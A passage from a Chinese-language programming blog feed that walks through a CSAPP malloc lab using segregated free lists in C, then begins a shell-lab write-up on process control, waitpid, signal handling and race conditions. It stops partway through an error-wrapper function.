class="hljs-type">void</span> *<span class="hljs-title function_">extend_heap</span><span class="hljs-params">(<span class="hljs-type">size_t</span> words)</span><br>&#123;<br>    <span class="hljs-comment">/* bp总是指向有效载荷 */</span><br>    <span class="hljs-type">char</span> *bp;<br>    <span class="hljs-type">size_t</span> size;<br>    <span class="hljs-comment">/* 根据传入字节数奇偶, 考虑对齐 */</span><br>    size = (words % <span class="hljs-number">2</span>) ? (words+<span class="hljs-number">1</span>) * WSIZE : words * WSIZE;<br><br>    <span class="hljs-comment">/* 分配 */</span><br>    <span class="hljs-keyword">if</span>((<span class="hljs-type">long</span>)(bp = mem_sbrk(size)) == <span class="hljs-number">-1</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-comment">/* 设置头部和脚部 */</span><br>    PUT(HDRP(bp), PACK(size, <span class="hljs-number">0</span>));           <span class="hljs-comment">/* 空闲块头 */</span><br>    PUT(FTRP(bp), PACK(size, <span class="hljs-number">0</span>));           <span class="hljs-comment">/* 空闲块脚 */</span><br>    PUT(HDRP(NEXT_BLKP(bp)), PACK(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>));   <span class="hljs-comment">/* 片的新结尾块 */</span><br><br>    <span class="hljs-comment">/* 判断相邻块是否是空闲块, 进行合并 */</span><br>    <span class="hljs-keyword">return</span> coalesce(bp);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="维护链表"><a href="#维护链表" class="headerlink" title="维护链表"></a>维护链表</h3><p>在知道要请求块的大小后，我们要先根据大小定位到相应大小类的头结点：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * search - 找到块大小对应的等价类的序号</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">search</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size)</span><br>&#123;<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">4</span>; i &lt;=<span class="hljs-number">22</span>; i++)&#123;<br>        <span class="hljs-keyword">if</span>(size &lt;= (<span class="hljs-number">1</span> &lt;&lt; i))<br>            <span class="hljs-keyword">return</span> i<span class="hljs-number">-4</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> i<span class="hljs-number">-4</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>注意，头结点位置下标是从 0 开始，所以返回<code>i-4</code>。这里还可以写一个二分查找的形式，但是优化作用不大。</p><p>找到头结点后，就涉及到双向链表的插入和删除了，下面编写这两个函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> *  插入块, 将块插到表头</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">insert</span><span class="hljs-params">(<span class="hljs-type">void</span> *bp)</span><br>&#123;<br>    <span class="hljs-comment">/* 块大小 */</span><br>    <span class="hljs-type">size_t</span> size = GET_SIZE(HDRP(bp));<br>    <span class="hljs-comment">/* 根据块大小找到头节点位置 */</span><br>    <span class="hljs-type">int</span> num = search(size);<br>    <span class="hljs-comment">/* 空的，直接放 */</span><br>    <span class="hljs-keyword">if</span>(GET_HEAD(num) == <span class="hljs-literal">NULL</span>)&#123;<br>        PUT(heap_list + WSIZE * num, bp);<br>        <span class="hljs-comment">/* 前驱 */</span><br>        PUT(bp, <span class="hljs-literal">NULL</span>);<br>        <span class="hljs-comment">/* 后继 */</span><br>        PUT((<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *)bp + <span class="hljs-number">1</span>, <span class="hljs-literal">NULL</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">/* bp的后继放第一个节点 */</span><br>        PUT((<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *)bp + <span class="hljs-number">1</span>, GET_HEAD(num));<br>        <span class="hljs-comment">/* 第一个节点的前驱放bp */</span><br>        PUT(GET_HEAD(num), bp);<br>        <span class="hljs-comment">/* bp的前驱为空 */</span>   <br>        PUT(bp, <span class="hljs-literal">NULL</span>);<br>        <span class="hljs-comment">/* 头节点放bp */</span><br>        PUT(heap_list + WSIZE * num, bp);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个函数还是比较容易编写的，主要是要注意以下几点：</p><ul><li>插入块总是插入到表头</li><li>指针问题要细致考虑。比如：<code>heap_list + WSIZE * num</code>是对应大小类头结点在堆中的位置，而<code>GET_HEAD(num)</code>是大小类头结点存放的第一个块的地址</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> *  删除块,清理指针</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">delete</span><span class="hljs-params">(<span class="hljs-type">void</span> *bp)</span><br>&#123;<br>    <span class="hljs-comment">/* 块大小 */</span><br>    <span class="hljs-type">size_t</span> size = GET_SIZE(HDRP(bp));<br>    <span class="hljs-comment">/* 根据块大小找到头节点位置 */</span><br>    <span class="hljs-type">int</span> num = search(size);<br>    <span class="hljs-comment">/* </span><br><span class="hljs-comment">     * 唯一节点,后继为null,前驱为null </span><br><span class="hljs-comment">     * 头节点设为null</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">if</span> (GET_PRE(bp) == <span class="hljs-literal">NULL</span> &amp;&amp; GET_SUC(bp) == <span class="hljs-literal">NULL</span>) &#123; <br>        PUT(heap_list + WSIZE * num, <span class="hljs-literal">NULL</span>);<br>    &#125; <br>    <span class="hljs-comment">/* </span><br><span class="hljs-comment">     * 最后一个节点 </span><br><span class="hljs-comment">     * 前驱的后继设为null</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (GET_PRE(bp) != <span class="hljs-literal">NULL</span> &amp;&amp; GET_SUC(bp) == <span class="hljs-literal">NULL</span>) &#123;<br>        PUT(GET_PRE(bp) + <span class="hljs-number">1</span>, <span class="hljs-literal">NULL</span>);<br>    &#125; <br>    <span class="hljs-comment">/* </span><br><span class="hljs-comment">     * 第一个结点 </span><br><span class="hljs-comment">     * 头节点设为bp的后继</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (GET_SUC(bp) != <span class="hljs-literal">NULL</span> &amp;&amp; GET_PRE(bp) == <span class="hljs-literal">NULL</span>)&#123;<br>        PUT(heap_list + WSIZE * num, GET_SUC(bp));<br>        PUT(GET_SUC(bp), <span class="hljs-literal">NULL</span>);<br>    &#125;<br>    <span class="hljs-comment">/* </span><br><span class="hljs-comment">     * 中间结点 </span><br><span class="hljs-comment">     * 前驱的后继设为后继</span><br><span class="hljs-comment">     * 后继的前驱设为前驱</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (GET_SUC(bp) != <span class="hljs-literal">NULL</span> &amp;&amp; GET_PRE(bp) != <span class="hljs-literal">NULL</span>) &#123;<br>        PUT(GET_PRE(bp) + <span class="hljs-number">1</span>, GET_SUC(bp));<br>        PUT(GET_SUC(bp), GET_PRE(bp));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>同样要注意指针的问题。比如：<code>GET_PRE(bp) + 1</code>是<code>bp</code>指向的块的前驱的后继的<strong>位置</strong>；而<code>GET_PRE(bp+1)</code>是<code>bp</code>指向的块的后继。我在这里因为 segmentation fault 卡了好久。</li></ul><h3 id="合并与分割-1"><a href="#合并与分割-1" class="headerlink" title="合并与分割"></a>合并与分割</h3><p>合并操作还是与 Implict Free List 一样，是根据空闲块在堆中位置相邻来合并的，与链表排列无关</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 合并空闲块</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">void</span> *<span class="hljs-title function_">coalesce</span><span class="hljs-params">(<span class="hljs-type">void</span> *bp)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> prev_alloc = GET_ALLOC(FTRP(PREV_BLKP(bp)));     <span class="hljs-comment">/* 前一块大小 */</span><br>    <span class="hljs-type">size_t</span> next_alloc = GET_ALLOC(HDRP(NEXT_BLKP(bp)));     <span class="hljs-comment">/* 后一块大小 */</span><br>    <span class="hljs-type">size_t</span> size = GET_SIZE(HDRP(bp));                       <span class="hljs-comment">/* 当前块大小 */</span><br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 四种情况：前后都不空, 前不空后空, 前空后不空, 前后都空</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-comment">/* 前后都不空 */</span><br>    <span class="hljs-keyword">if</span>(prev_alloc &amp;&amp; next_alloc)&#123;<br>        insert(bp);<br>        <span class="hljs-keyword">return</span> bp;<br>    &#125;<br>    <span class="hljs-comment">/* 前不空后空 */</span><br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(prev_alloc &amp;&amp; !next_alloc)&#123;<br>        <span class="hljs-comment">/* 将后面的块从其链表中删除 */</span><br>        delete(NEXT_BLKP(bp));<br>        size += GET_SIZE(HDRP(NEXT_BLKP(bp)));  <span class="hljs-comment">//增加当前块大小</span><br>        PUT(HDRP(bp), PACK(size, <span class="hljs-number">0</span>));           <span class="hljs-comment">//先修改头</span><br>        PUT(FTRP(bp), PACK(size, <span class="hljs-number">0</span>));           <span class="hljs-comment">//根据头部中的大小来定位尾部</span><br>    &#125;<br>    <span class="hljs-comment">/* 前空后不空 */</span><br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(!prev_alloc &amp;&amp; next_alloc)&#123;<br>        <span class="hljs-comment">/* 将其前面的快从链表中删除 */</span><br>        delete(PREV_BLKP(bp));<br>        size += GET_SIZE(HDRP(PREV_BLKP(bp)));  <span class="hljs-comment">//增加当前块大小</span><br>        PUT(FTRP(bp), PACK(size, <span class="hljs-number">0</span>));<br>        PUT(HDRP(PREV_BLKP(bp)), PACK(size, <span class="hljs-number">0</span>));<br>        bp = PREV_BLKP(bp);                     <span class="hljs-comment">//注意指针要变</span><br>    &#125;<br>    <span class="hljs-comment">/* 都空 */</span><br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-comment">/* 将前后两个块都从其链表中删除 */</span><br>        delete(NEXT_BLKP(bp));<br>        delete(PREV_BLKP(bp));<br>        size += GET_SIZE(HDRP(PREV_BLKP(bp))) + GET_SIZE(FTRP(NEXT_BLKP(bp)));  <span class="hljs-comment">//增加当前块大小</span><br>        PUT(FTRP(NEXT_BLKP(bp)), PACK(size, <span class="hljs-number">0</span>));<br>        PUT(HDRP(PREV_BLKP(bp)), PACK(size, <span class="hljs-number">0</span>));<br>        bp = PREV_BLKP(bp);<br>    &#125;<br>    <span class="hljs-comment">/* 空闲块准备好后,将其插入合适位置 */</span><br>    insert(bp);<br>    <span class="hljs-keyword">return</span> bp;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>操作与 Implict Free List 几乎相同</li><li>额外的操作就是合并前要将前后的空闲块从它的原链表中删除，合并完成后要将新的空闲块插入对应的空闲链表中</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 分离空闲块</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">place</span><span class="hljs-params">(<span class="hljs-type">void</span> *bp, <span class="hljs-type">size_t</span> asize)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> csize = GET_SIZE(HDRP(bp));<br><br>    <span class="hljs-comment">/* 块已分配，从空闲链表中删除 */</span><br>    delete(bp);<br>    <span class="hljs-keyword">if</span>((csize - asize) &gt;= <span class="hljs-number">2</span>*DSIZE) &#123;<br>        PUT(HDRP(bp), PACK(asize, <span class="hljs-number">1</span>));<br>        PUT(FTRP(bp), PACK(asize, <span class="hljs-number">1</span>));<br>        <span class="hljs-comment">/* bp指向空闲块 */</span><br>        bp = NEXT_BLKP(bp);<br>        PUT(HDRP(bp), PACK(csize - asize, <span class="hljs-number">0</span>));<br>        PUT(FTRP(bp), PACK(csize - asize, <span class="hljs-number">0</span>));<br>        <span class="hljs-comment">/* 加入分离出来的空闲块 */</span><br>        insert(bp);<br>    &#125;<br>    <span class="hljs-comment">/* 设置为填充 */</span><br>    <span class="hljs-keyword">else</span>&#123;<br>        PUT(HDRP(bp), PACK(csize, <span class="hljs-number">1</span>));<br>        PUT(FTRP(bp), PACK(csize, <span class="hljs-number">1</span>));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>分离空闲块也只是加入了将分离出来的空闲块插入相应空闲链表的操作</li></ul><h3 id="分配块"><a href="#分配块" class="headerlink" title="分配块"></a>分配块</h3><p>Segregated Fit 的分配策略就很清晰了：</p><ul><li>先从对应的大小类的空闲链表中查找</li><li>如果找不到，则到下一个更大的大小类查找</li><li>如果都找不到，则扩展堆</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 适配</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">void</span> *<span class="hljs-title function_">find_fit</span><span class="hljs-params">(<span class="hljs-type">size_t</span> asize)</span><br>&#123;<br>    <span class="hljs-type">int</span> num = search(asize);<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>* bp;<br>    <span class="hljs-comment">/* 如果找不到合适的块，那么就搜索下一个更大的大小类 */</span><br>    <span class="hljs-keyword">while</span>(num &lt; CLASS_SIZE) &#123;<br>        bp = GET_HEAD(num);<br>        <span class="hljs-comment">/* 不为空则寻找 */</span><br>        <span class="hljs-keyword">while</span>(bp) &#123;<br>            <span class="hljs-keyword">if</span>(GET_SIZE(HDRP(bp)) &gt;= asize)&#123;<br>                <span class="hljs-keyword">return</span> (<span class="hljs-type">void</span> *)bp;<br>            &#125;<br>            <span class="hljs-comment">/* 用后继找下一块 */</span><br>            bp = GET_SUC(bp);<br>        &#125;<br>        <span class="hljs-comment">/* 找不到则进入下一个大小类 */</span><br>        num++;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/202402021927457.png" alt="结果"></p><p>与 Implict Free List 进行对比，发现本方法空间利用率略微降低了，而吞吐量提高了近 50 倍！</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>CSAPP课本的排版很有意思，比如Implict Free List 花费了大量篇幅讲解，给出了所有代码，而后面的 Segregated Free Lists 却几乎是一笔带过。现在做完了实验才知道，原来是要把这部分放进实验考察，果然读 CSAPP 一定要做实验，两者是相得益彰的。</li><li>一堆宏定义与指针写的头皮发麻</li></ul>]]></content>
    
    
    <categories>
      
      <category>CSAPP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>malloc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>csapp shlab</title>
    <link href="/2023/12/29/csapp-shlab/"/>
    <url>/2023/12/29/csapp-shlab/</url>
    
    <content type="html"><![CDATA[<h1 id="CSAPP-shell-Lab"><a href="#CSAPP-shell-Lab" class="headerlink" title="CSAPP shell Lab"></a>CSAPP shell Lab</h1><p>Lab Assignment L5: **Writing Your Own Unix Shell! **</p><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>The purpose of this assignment is to become more familiar with the concepts of <strong>process control and signalling</strong>. You’ll do this by writing a simple Unix shell program that supports job control. </p><p>Looking at the tsh.c (tiny shell) file, you will see that it contains a functional skeleton of a simple Unix shell. To help you get started, we have already implemented the less interesting functions. Your assignment is to complete the remaining empty functions listed below. As a sanity check for you, we’ve listed the approximate number of lines of code for each of these functions in our reference solution (which includes lots of comments).</p><ul><li>eval: Main routine that parses and interprets the command line. [70 lines] 解析命令行</li><li>builtin cmd: Recognizes and interprets the built-in commands: quit, fg, bg, and jobs. [25 lines] 检测是否为内置命令<code>quit</code>、<code>fg</code>、<code>bg</code>、<code>jobs</code></li><li>do bgfg: Implements the bg and fg built-in commands. [50 lines] 实现内置命令<code>fg</code>、<code>bg</code></li><li>waitfg: Waits for a foreground job to complete. [20 lines] 等待前台作业执行完成</li><li>sigchld handler: Catches SIGCHILD signals. 80 lines]  处理<code>SIGCHILD</code>信号，即子进程停止或者终止</li><li>sigint handler: Catches SIGINT (ctrl-c) signals. [15 lines] 处理<code>SIGINT</code>信号，即键盘中断<code>ctrl-c</code> </li><li>sigtstp handler: Catches SIGTSTP (ctrl-z) signals. [15 lines]处理<code>SIGSTP</code>信号，即来自终端的停止信号</li></ul><h3 id="The-tsh-Specification"><a href="#The-tsh-Specification" class="headerlink" title="The tsh Specification"></a>The <code>tsh</code> Specification</h3><p>Your tsh shell should have the following features:</p><ul><li><p>The prompt should be the string “tsh&gt; ”. </p></li><li><p>The command line typed by the user should consist of a name and zero or more arguments, all separated by one or more spaces. If <code>name</code> is a built-in command, then tsh should handle it immediately and wait for the next command line. Otherwise, tsh should assume that <code>name</code> is the path of an executable file, which it loads and runs in the context of an initial child process (In this context, the term job refers to this initial child process). </p></li><li><p>tsh need not support pipes (|) or I&#x2F;O redirection (&lt; and &gt;).</p></li><li><p>Typing ctrl-c (ctrl-z) should cause a SIGINT (SIGTSTP) signal to be sent to the current foreground job, as well as any descendents of that job (e.g., any child processes that it forked). If there is no foreground job, then the signal should have no effect.</p></li><li><p>If the command line ends with an ampersand &amp;, then tsh should run the job in the background. Otherwise, it should run the job in the foreground.</p></li><li><p>Each job can be <strong>identified by either a process ID</strong> (PID) or a job ID (JID), which is a positive integer assigned by tsh. JIDs should be denoted on the command line by the prefix ’%’. For example, “%5” denotes JID 5, and “5” denotes PID 5. (We have provided you with all of the routines you need for manipulating the job list.) </p></li><li><p>tsh should support the following built-in commands: </p><p>​– The quit command terminates the shell. </p><p>​– The jobs command lists all background jobs. </p><p>​– The bg  command restarts  by sending it a SIGCONT signal, and then runs it in the background. The  argument can be either a PID or a JID. </p><p>​– The fg  command restarts  by sending it a SIGCONT signal, and then runs it in the foreground. The  argument can be either a PID or a JID. </p></li><li><p>tsh should reap all of its zombie children. If any job terminates because it receives a signal that it didn’t catch, then tsh should recognize this event and print a message with the job’s PID and a description of the offending signal.</p></li></ul><h2 id="开始冻手"><a href="#开始冻手" class="headerlink" title="开始冻手"></a>开始冻手</h2><h3 id="Revisit-回收子进程"><a href="#Revisit-回收子进程" class="headerlink" title="Revisit: 回收子进程"></a>Revisit: 回收子进程</h3><p>一个终止了但还未被回收的进程称为僵死进程。对于一个长时间运行的程序（比如 Shell）来说，内核不会安排<code>init</code>进程去回收僵死进程，而它虽不运行却仍然消耗系统资源，因此实验要求我们回收所有的僵死进程。</p><p><code>waitpid</code>是一个非常重要的函数，一个进程可以调用<code>waitpid</code>函数来等待它的子进程终止或停止，从而回收子进程，在本实验大量用到，我们必须学习它的用法：</p><ul><li>子进程终止</li><li>子进程收到信号停止</li><li>子进程收到信号重新执行</li></ul><p>如果一个子进程在调用之前就已经终止了，那么函数就会立即返回，否则，就会阻塞，直到一个子进程改变状态。</p><p>等待集合以及监测那些状态都是用函数的参数确定的，函数定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">pid_t</span> <span class="hljs-title function_">waitpid</span><span class="hljs-params">(<span class="hljs-type">pid_t</span> pid, <span class="hljs-type">int</span> *wstatus, <span class="hljs-type">int</span> options)</span>;<br></code></pre></td></tr></table></figure><p>各参数含义及使用</p><ul><li><strong>pid：判定等待集合成员</strong><ul><li>pid &gt; 0 : 等待集合为 pid 对应的单独子进程</li><li>pid &#x3D; -1: 等待集合为所有的子进程</li><li>pid &lt; -1: 等待集合为一个进程组，ID 为 pid 的绝对值</li><li>pid &#x3D; 0 : 等待集合为一个进程组，ID 为调用进程的 pid</li></ul></li><li><strong>options：修改默认行为</strong><ul><li>WNOHANG：集合中任何子进程都未终止，立即返回 0</li><li>WUNTRACED：阻塞，直到一个进程终止或停止，返回 PID</li><li>WCONTINUED：阻塞，直到一个停止的进程收到 SIGCONT 信号重新开始执行</li><li>也可以用或运算把 options 的选项组合起来。例如 WNOHANG | WUNTRACED 表示：立即返回，如果等待集合中的子进程都没有被停职或终止，则返回值为 0；如果有一个停止或终止，则返回值为该子进程的 PID</li></ul></li><li><strong>statusp：检查已回收子进程的退出状态</strong><ul><li>waitpid 会在 status 中放上关于导致返回的子进程的状态信息</li></ul></li></ul><h3 id="Revisit-并发编程原则"><a href="#Revisit-并发编程原则" class="headerlink" title="Revisit: 并发编程原则"></a>Revisit: 并发编程原则</h3><ol><li>保存和恢复errno。很多函数会在出错时设置errno，在处理程序中调用这样的函数可能会告饶主程序中其他依赖于errno的部分，解决办法是在进入处理函数时用局部变量保存它，运行完成后再将其恢复</li><li>访问全局数据时，阻塞所有信号。</li><li>不可以用信号来对其它进程中发生的事情计数。未处理的信号是不排队的，即每种类型的信号最多只能有一个待处理信号。<strong>举例</strong>：如果父进程将要接受三个相同的信号，当处理程序还在处理一个信号时，第二个信号就会加入待处理信号集合，如果此时第三个信号到达，那么它就会被简单地丢弃，从而出现问题</li><li>注意考虑同步错误：竞争。</li></ol><h3 id="Revisit-竞争"><a href="#Revisit-竞争" class="headerlink" title="Revisit: 竞争"></a>Revisit: 竞争</h3><p>  <img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/202401181620016.png" alt="竞争的示例"></p><p>这是一个 Unix Shell 的框架，父进程在一个全局列表中记录子进程，并设置了一个 SIGCHLD 处理程序来回收子进程，乍一看没问题，但是考虑如下可能的事件序列：</p><ul><li>第 29 行，创建子进程运行</li><li>假设子进程在父进程运行到 32 行，即运行<code>addjob</code>函数之前就结束了，并发送一个 SIGCHLD 信号</li><li>父进程接收到信号，运行信号处理程序，调用<code>deletejob</code>函数，而这个<code>job</code>本来就没有添加入列表</li><li>返回父进程，调用<code>addjob</code>函数，而这个子进程已经终止并回收了，<code>job</code>早就不存在了</li></ul><p>也就是说，在这里，<code>deletejob</code>函数的调用发生在了<code>addjob</code>之前，导致错误。我们称<code>addjob</code>和<code>deletejob</code>存在竞争。</p><p>解决方法即在父进程<code>folk</code>之前就阻塞SIGCHLD信号</p><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/202401181638081.png" alt="解决方法"></p><h3 id="错误处理包装函数"><a href="#错误处理包装函数" class="headerlink" title="错误处理包装函数"></a>错误处理包装函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Error wrapper function */</span><br><span class="hljs-type">pid_t</span> <span class="hljs-title function_">Fork</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">Sigprocmask</span><span class="hljs-params">(<span class="hljs-type">int</span> how, <span class="hljs-type">const</span> <span class="hljs-type">sigset_t</span> *<span class="hljs-built_in">set</span>, <span class="hljs-type">sigset_t</span> *oldset)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">Sigemptyset</span><span class="hljs-params">(<span class="hljs-type">sigset_t</span> *<span class="hljs-built_in">set</span>)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">Sigfillset</span><span class="hljs-params">(<span class="hljs-type">sigset_t</span> *<span class="hljs-built_in">set</span>)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">Sigaddset</span><span class="hljs-params">(<span class="hljs-type">sigset_t</span> *<span class="hljs-built_in">set</span>, <span class="hljs-type">int</span> signum)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">Execve</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *filename, <span class="hljs-type">char</span> *<span class="hljs-type">const</span> argv[], <span class="hljs-type">char</span> *<span class="hljs-type">const</span> envp[])</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">Setpgid</span><span class="hljs-params">(<span class="hljs-type">pid_t</span> pid, <span class="hljs-type">pid_t</span> pgid)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">Kill</span><span class="hljs-params">(<span class="hljs-type">pid_t</span> pid, <span class="hljs-type">int</span> sig)</span>;<br><span class="hljs-type">pid_t</span> <span class="hljs-title function_">Fork</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>&#123;<br>    <span class="hljs-type">pid_t</span> pid;<br>    <span class="hljs-keyword">if</span>((pid = fork()) &lt; <span 